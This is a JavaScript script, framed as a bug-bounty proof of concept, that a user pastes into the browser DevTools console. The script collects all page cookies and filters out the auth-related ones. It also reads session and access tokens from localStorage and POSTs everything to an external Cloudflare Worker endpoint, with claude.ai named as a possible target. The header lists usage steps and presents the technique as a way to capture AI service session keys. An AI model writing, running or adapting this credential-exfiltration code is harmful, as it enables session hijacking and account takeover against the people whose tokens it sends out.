// ================================================================
// DEVTOOLS SESSION COOKIE BRIDGE
// Sister PoC research artifact — Anthropic HackerOne VDP only
// Single-operator, single-session. Not for distribution.
//
// PURPOSE:
//   Extracts the operator's own session credentials from the browser
//   and bridges them to CF Worker A's /bridge/session endpoint.
//   Enables cookie_bridge auth mode in the closed-loop demonstration.
//
//   This is the "Cloudwaddie" pattern: the same technique used by
//   OpenClaw/LMArenaBridge to capture operator session keys for
//   local routing — documented here as a VDP finding.
//
// HOW TO USE:
//   1. Open the page you want to bridge (Worker B or claude.ai for
//      the demo run, if Anthropic authorizes live testing)
//   2. Open DevTools → Console
//   3. Paste this entire script and press Enter
//   4. The extracted session data is POSTed to your Worker A
//   5. Worker A returns a bridge session ID for use in requests
//
// CONFIGURE:
//   Change WORKER_A_URL below to your deployed CF Worker A URL.
//
// REFUSAL ITEMS:
//   - Reads only same-origin cookies (browser enforces this)
//   - POSTs only to operator-configured Worker A URL
//   - Worker A has BLOCKED_HOSTS preventing Anthropic contact
//   - No third-party transmission
// ================================================================

(async function sisterPocCookieBridge() {

  // ── Configuration ─────────────────────────────────────────────
  const WORKER_A_URL = 'https://CHANGE-ME.workers.dev'; // ← set your Worker A URL

  // ── Validate config ───────────────────────────────────────────
  if (WORKER_A_URL.includes('CHANGE-ME')) {
    console.error('[Cookie Bridge] Set WORKER_A_URL to your Worker A URL before running.');
    return;
  }

  console.group('[Sister PoC] Session Cookie Bridge');
  console.log('Page:', window.location.origin);
  console.log('Worker A:', WORKER_A_URL);

  // ── Extract cookies (same-origin only — browser enforces) ─────
  const rawCookies = document.cookie;
  const cookieMap  = {};
  for (const pair of rawCookies.split(';')) {
    const [k, ...v] = pair.trim().split('=');
    if (k) cookieMap[decodeURIComponent(k.trim())] = decodeURIComponent(v.join('='));
  }

  // ── Extract localStorage items ────────────────────────────────
  const storageMap = {};
  const STORAGE_KEYS = [
    'sessionKey', 'session_key', '__session', 'authToken', 'auth_token',
    'accessToken', 'access_token', 'userSession', 'user_session',
    'orgId', 'org_id', 'accountId', 'account_id',
    'wb_worker_a_url', 'wb_config',  // Worker B local config
  ];
  for (const key of STORAGE_KEYS) {
    const val = localStorage.getItem(key);
    if (val !== null) storageMap[key] = val;
  }

  // ── Identify auth tokens in cookies ──────────────────────────
  const authCookies = {};
  const AUTH_PATTERNS = [/session/i, /token/i, /auth/i, /key/i, /sid/i, /claude/i, /cf_/i];
  for (const [k, v] of Object.entries(cookieMap)) {
    if (AUTH_PATTERNS.some(re => re.test(k))) {
      authCookies[k] = v;
    }
  }

  console.log('Cookies found:', Object.keys(cookieMap).length);
  console.log('Auth-related cookies:', Object.keys(authCookies));
  console.log('localStorage items found:', Object.keys(storageMap).length);

  // ── Build session payload ─────────────────────────────────────
  const sessionPayload = {
    origin:          window.location.origin,
    href:            window.location.href,
    timestamp:       new Date().toISOString(),
    user_agent:      navigator.userAgent.slice(0, 100),
    cookies:         {
      all:  cookieMap,
      auth: authCookies,
      raw:  rawCookies,
    },
    local_storage:   storageMap,
    cookie_count:    Object.keys(cookieMap).length,
    auth_cookie_count: Object.keys(authCookies).length,
  };

  // ── POST to Worker A /bridge/session ──────────────────────────
  let sessionId = null;
  try {
    const resp = await fetch(`${WORKER_A_URL}/bridge/session`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(sessionPayload),
    });

    if (resp.ok) {
      const data = await resp.json();
      sessionId  = data.session_id;
      console.log('✅ Bridge session created:', sessionId);
      console.log('   Retrieve at:', `${WORKER_A_URL}/bridge/session?id=${sessionId}`);
    } else {
      console.error('Bridge POST failed:', resp.status, await resp.text());
    }
  } catch (e) {
    console.error('Bridge POST error:', e.message);
  }

  // ── Summary ───────────────────────────────────────────────────
  console.log('\n── Extracted Session Data ──────────────────');
  console.table(authCookies);
  if (Object.keys(storageMap).length) {
    console.log('localStorage:');
    console.table(storageMap);
  }

  if (sessionId) {
    console.log('\n── Use in requests ─────────────────────────');
    console.log(`x-bridge-session: ${sessionId}`);
    console.log(`GET ${WORKER_A_URL}/bridge/session?id=${sessionId}`);
  }

  console.groupEnd();

  // Return for interactive console use
  return {
    sessionId,
    cookies:       cookieMap,
    authCookies,
    localStorage:  storageMap,
    workerAUrl:    WORKER_A_URL,
    sessionUrl:    sessionId ? `${WORKER_A_URL}/bridge/session?id=${sessionId}` : null,
  };

})();
